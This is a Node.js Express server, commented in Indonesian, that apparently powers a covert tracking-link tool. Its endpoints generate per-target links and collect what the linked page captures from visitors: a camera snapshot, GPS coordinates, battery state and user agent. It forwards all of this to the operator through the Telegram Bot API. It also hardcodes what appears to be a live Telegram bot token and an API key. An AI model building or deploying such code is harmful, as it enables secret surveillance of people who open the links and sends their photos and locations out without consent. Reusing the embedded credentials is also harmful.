const express = require('express');
const axios = require('axios');
const FormData = require('form-data');
const { v4: uuidv4 } = require('uuid');
const cors = require('cors');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

const API_KEY = process.env.API_KEY || "KucingTerbangWarnaWarni123!";
const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN || "6598957548:AAFd8OLzgH-ageyLfDGDxrEhoIS5CuHJ_sc"; 

const tracking_data = {};

app.use(cors());
app.use(express.json({ limit: '10mb' }));
app.use(express.static(path.join(__dirname, 'public')));

const apiKeyAuth = (req, res, next) => {
    const apiKey = req.headers['x-api-key'];
    if (apiKey && apiKey === API_KEY) {
        next();
    } else {
        res.status(403).json({ status: "error", message: "Unauthorized: Invalid API Key" });
    }
};

async function sendTelegramNotification(chatId, alias, data) {
    const telegramApiUrl = `https://api.telegram.org/bot${TELEGRAM_TOKEN}`;
    console.log(`[INFO] Memulai pengiriman notifikasi lengkap untuk ${alias}...`);
    
    try {
        const detailText = `*Laporan Teks untuk ${alias}*\n\n` +
                           `*Waktu:* ${new Date(data.timestamp).toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' })}\n\n` +
                           `*🔋 Baterai:*\nLevel: ${data.deviceInfo?.battery?.level || 'N/A'}\nMengisi Daya: ${data.deviceInfo?.battery?.isCharging ? 'Ya' : 'Tidak'}\n\n` +
                           `*💻 Perangkat:*\n${data.deviceInfo?.userAgent || 'N/A'}`;

        if (data.photoBase64) {
            const photoBuffer = Buffer.from(data.photoBase64.replace(/^data:image\/jpeg;base64,/, ""), 'base64');
            const formData = new FormData();
            
            formData.append('chat_id', chatId);
            formData.append('photo', photoBuffer, 'snapshot.jpg');
            formData.append('caption', `🔔 *Update Baru untuk ${alias}!*\n\n${detailText}`);
            formData.append('parse_mode', 'Markdown');
            
            await axios.post(`${telegramApiUrl}/sendPhoto`, formData, {
                headers: formData.getHeaders()
            });
            console.log(`[SUCCESS] Notifikasi foto & teks untuk ${alias} terkirim.`);

        } else {
            const messageText = `🔔 *Update Baru untuk ${alias}!*\n\n${detailText}`;
            await axios.post(`${telegramApiUrl}/sendMessage`, {
                chat_id: chatId,
                text: messageText,
                parse_mode: 'Markdown'
            });
            console.log(`[SUCCESS] Notifikasi teks (tanpa foto) untuk ${alias} terkirim.`);
        }

        if (data.location) {
            await axios.post(`${telegramApiUrl}/sendLocation`, {
                chat_id: chatId,
                latitude: data.location.lat,
                longitude: data.location.lon
            });
            console.log(`[SUCCESS] Notifikasi lokasi untuk ${alias} terkirim.`);
        }

    } catch (error) {
        console.error(`[ERROR] Gagal mengirim notifikasi Telegram lengkap:`, error.response ? error.response.data : error.message);
    }
}


app.post('/api/data', (req, res) => {
    const { link_id, data } = req.body;
    if (!link_id || !data) return res.status(400).json({ status: "error", message: "Data tidak lengkap" });
    
    let found = false;
    for (const userId in tracking_data) {
        for (const alias in tracking_data[userId]) {
            if (tracking_data[userId][alias].link_id === link_id) {
                const current_data = { ...data, timestamp: new Date().toISOString() };
                tracking_data[userId][alias].last_data = current_data;
                found = true;
                console.log(`[SUCCESS] Data untuk alias '${alias}' berhasil disimpan.`);
                
                // Panggil fungsi notifikasi baru yang canggih!
                sendTelegramNotification(userId, alias, current_data);
                break;
            }
        }
        if (found) break;
    }

    if (found) {
        res.json({ status: "sukses" });
    } else {
        res.status(404).json({ status: "error", message: "Link ID tidak ditemukan" });
    }
});

app.post('/api/create_link', apiKeyAuth, (req, res) => {
    const { user_id, alias } = req.body;
    if (!user_id || !alias) {
        return res.status(400).json({ status: "error", message: "user_id dan alias diperlukan" });
    }
    const link_id = uuidv4();
    const link_url = `${req.protocol}://${req.get('host')}/?id=${link_id}`;
    if (!tracking_data[user_id]) {
        tracking_data[user_id] = {};
    }
    tracking_data[user_id][alias] = {
        link_id: link_id,
        last_data: null,
        link: link_url,
        created_at: new Date().toISOString()
    };
    console.log(`[INFO] Link dibuat untuk user ${user_id} dengan alias ${alias}`);
    res.json({ status: "sukses", link: link_url });
});

app.get('/api/list_links/:user_id', apiKeyAuth, (req, res) => {
    const { user_id } = req.params;
    const userLinks = tracking_data[user_id];
    if (!userLinks) {
        return res.json({ status: "sukses", links: [] });
    }
    const linksToReturn = Object.keys(userLinks).map(alias => ({
        alias: alias,
        link: userLinks[alias].link,
        has_data: !!userLinks[alias].last_data
    }));
    res.json({ status: "sukses", links: linksToReturn });
});

app.get('/api/get_data/:user_id/:alias', apiKeyAuth, (req, res) => {
    const { user_id, alias } = req.params;
    const trackingInfo = tracking_data[user_id]?.[alias];
    if (trackingInfo && trackingInfo.last_data) {
        res.json({ status: "sukses", data: trackingInfo.last_data });
    } else {
        res.status(404).json({ status: "error", message: "Data belum tersedia atau alias tidak ditemukan." });
    }
});

app.post('/api/delete_link', apiKeyAuth, (req, res) => {
    const { user_id, alias } = req.body;
    if (tracking_data[user_id]?.[alias]) {
        delete tracking_data[user_id][alias];
        console.log(`[INFO] Link untuk alias ${alias} dari user ${user_id} telah dihapus.`);
        res.json({ status: "sukses", message: `Link untuk ${alias} berhasil dihapus.` });
    } else {
        res.status(404).json({ status: "error", message: "Alias tidak ditemukan" });
    }
});

// 6. JALANKAN SERVER
app.listen(PORT, () => {
    console.log(`Server pelacakan (versi notifikasi lengkap) berjalan di port ${PORT}`);
});
